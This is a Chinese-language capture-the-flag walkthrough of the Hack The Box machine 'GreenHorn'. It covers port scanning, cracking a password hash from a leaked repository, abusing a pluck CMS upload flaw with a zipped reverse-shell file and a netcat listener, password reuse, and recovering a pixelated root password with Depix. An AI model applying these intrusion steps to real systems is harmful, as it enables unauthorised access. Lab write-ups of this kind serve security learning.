## port scan

```shell
┌──(root㉿kali)-[~/HackTheBox/GreenHorn]
└─# nmap 10.10.11.25    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 03:33 EST
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

开放三个端口

## web

查看80端口，发现是`pluck 4.7.18`，这个版本有一个文件上传漏洞（CVE-2023-50564）

需要登录后台，爆破无果

查看3000端口，注册账号，发现源代码

```
http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
```

发现pass.php，存在密码hash值

```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

爆破出密码`iloveyou1`

![image-20241125165243624](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241125165243624.png)

压缩反弹shell

```
zip rev.zip rev.php
```

`rlwrap nc -lvnp 1234`

成功拿到shell

## user flag

发现`junior`用户，尝试密码`iloveyou1`喷洒，成功登录

![image-20241125165753583](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241125165753583.png)

将pdf下载下来

![image-20241125165824678](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241125165824678.png)

发现password被隐藏了

## root flag

用了 pdfimages 来将图片中的涂抹部分提取为 png图片

```
sudo apt-get install poppler-utils
pdfimages greenhorn.pdf ./root
```

depix: https://github.com/spipm/Depix 修复像素

```
python3 depix.py -p ../root-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ../root_pass.png
```

然后查看还原的图片

![image-20241125170031562](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241125170031562.png)

密码：`sidefromsidetheothersidesidefromsidetheotherside`

成功登录root